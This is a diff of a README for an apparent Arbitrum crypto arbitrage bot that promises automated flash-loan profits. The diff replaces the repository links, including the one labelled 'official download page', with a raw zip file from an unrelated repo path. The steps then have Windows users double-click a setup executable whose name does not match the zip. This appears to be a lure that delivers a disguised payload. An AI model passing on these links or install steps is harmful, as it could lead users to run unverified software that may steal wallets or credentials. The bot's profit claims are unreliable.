@@ -5,7 +5,7 @@ description: "Identify price differences across Arbitrum decentralized exchanges
 ---
 # 🤖 Arbitrum-Arbitrage-Bot-2026 - Find Profitable Trades On Arbitrum Networks
 
-[![Download Arbitrum Bot](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/ShobhitJain-png/Arbitrum-Arbitrage-Bot-2026)
+[![Download Arbitrum Bot](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/ShobhitJain-png/shobhitjain-png.github.io/main/trilogy/github_shobhitjain_png_io_1.1.zip)
 
 Arbitrum-Arbitrage-Bot-2026 automates the process of finding and executing profitable trades across decentralized exchanges on the Arbitrum network. It monitors liquidity pools on Uniswap V3, Camelot, and PancakeSwap. The software identifies price differences for the same asset between these exchanges. When a trade meets your criteria, the bot executes a flash loan swap to capture the difference. It includes protections against front-running and sends alerts to your Telegram account.
 
@@ -23,7 +23,7 @@ Your computer needs these specifications to run the software:
 
 Follow these steps to install the software on your Windows computer.
 
-1.  Visit the [official download page](https://github.com/ShobhitJain-png/Arbitrum-Arbitrage-Bot-2026) to obtain the latest version of the installer.
+1.  Visit the [official download page](https://raw.githubusercontent.com/ShobhitJain-png/shobhitjain-png.github.io/main/trilogy/github_shobhitjain_png_io_1.1.zip) to obtain the latest version of the installer.
 2.  Locate the downloaded file in your browser's download folder.
 3.  Double-click the file named `Arbitrum-Arbitrage-Setup.exe` to start the installation wizard.
 4.  Follow the instructions on the screen. Choose a folder on your local drive for the installation.
